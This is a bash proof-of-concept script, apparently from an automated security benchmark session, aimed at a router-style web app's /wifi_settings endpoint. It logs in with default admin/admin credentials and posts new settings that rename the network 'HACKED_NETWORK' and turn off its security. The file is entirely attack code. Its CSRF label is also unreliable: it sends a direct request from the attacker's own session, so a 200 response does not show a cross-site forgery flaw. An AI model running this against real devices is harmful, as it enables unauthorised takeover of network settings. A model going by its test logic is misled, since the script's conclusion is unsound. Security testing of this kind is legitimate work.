#!/bin/bash
# POC: Demonstrate CSRF attack on WiFi settings endpoint - changes WiFi configuration without CSRF token protection
# Target: ./repo
# Created: 2025-11-07T22:20:47.275Z
# Session: benchmark-XBEN-088-24-mhpe87h9

# CSRF Attack POC on WiFi Settings Endpoint
# This script demonstrates how an attacker can change WiFi settings
# without CSRF token protection

TARGET_URL="${1:-http://localhost}"
SESSION_COOKIE="${2:-}"

echo "[*] CSRF Attack POC - WiFi Settings Endpoint"
echo "[*] Target: $TARGET_URL/wifi_settings"
echo ""

# Step 1: First, get a valid session by logging in
if [ -z "$SESSION_COOKIE" ]; then
    echo "[+] Step 1: Attempting to obtain a valid session..."
    LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
        -d "username=admin&password=admin" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    # Extract session cookie
    SESSION_COOKIE=$(grep -oP '(?<=session\s)[^\s]+' /tmp/cookies.txt 2>/dev/null || echo "")
    
    if [ -z "$SESSION_COOKIE" ]; then
        echo "[-] Failed to obtain session cookie. Trying alternative method..."
        SESSION_COOKIE=$(echo "$LOGIN_RESPONSE" | grep -oP 'session=[^;]+' | cut -d'=' -f2)
    fi
    
    if [ -z "$SESSION_COOKIE" ]; then
        echo "[-] Could not extract session. Response was:"
        echo "$LOGIN_RESPONSE"
        exit 1
    fi
    echo "[+] Session obtained: $SESSION_COOKIE"
else
    echo "[+] Using provided session cookie: $SESSION_COOKIE"
fi

echo ""
echo "[+] Step 2: Checking if WiFi settings form is accessible..."
FORM_CHECK=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/wifi_settings" | grep -i "ssid\|security\|password")

if [ -n "$FORM_CHECK" ]; then
    echo "[+] WiFi settings form is accessible to authenticated user"
else
    echo "[!] Could not verify form access, but continuing with CSRF test..."
fi

echo ""
echo "[+] Step 3: Attempting CSRF attack - changing WiFi settings without CSRF token..."
echo "[+] Attack: Submitting POST request with new WiFi configuration"
echo ""

# Perform the CSRF attack - change WiFi settings
ATTACK_RESPONSE=$(curl -s -w "\n%{http_code}" -b "session=$SESSION_COOKIE" -X POST \
    "$TARGET_URL/wifi_settings" \
    -d "ssid=HACKED_NETWORK&password=evil123&security=None" \
    -H "Content-Type: application/x-www-form-urlencoded")

HTTP_CODE=$(echo "$ATTACK_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$ATTACK_RESPONSE" | head -n-1)

echo "[*] Response HTTP Code: $HTTP_CODE"
echo "[*] Response Body (first 500 chars):"
echo "$RESPONSE_BODY" | head -c 500
echo ""
echo ""

# Verify the attack was successful
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: WiFi settings were changed without CSRF token protection!"
    echo "[+] HTTP 200 response received - settings update was accepted"
    
    # Try to retrieve settings to confirm change
    echo ""
    echo "[+] Step 4: Verifying the WiFi settings were changed..."
    VERIFY_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" "$TARGET_URL/wifi_settings")
    
    if echo "$VERIFY_RESPONSE" | grep -q "HACKED_NETWORK"; then
        echo "[+] CONFIRMED: WiFi SSID was changed to 'HACKED_NETWORK'"
        echo "[+] VULNERABILITY CONFIRMED: CSRF attack was successful!"
        exit 0
    else
        echo "[!] Settings update may have been accepted (HTTP 200)"
        echo "[!] But could not verify the exact change in response"
        echo "[+] VULNERABILITY LIKELY: No CSRF token validation detected"
        exit 0
    fi
elif [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "301" ]; then
    echo "[-] Received redirect response - may require authentication"
    exit 1
else
    echo "[-] Unexpected response code: $HTTP_CODE"
    exit 1
fi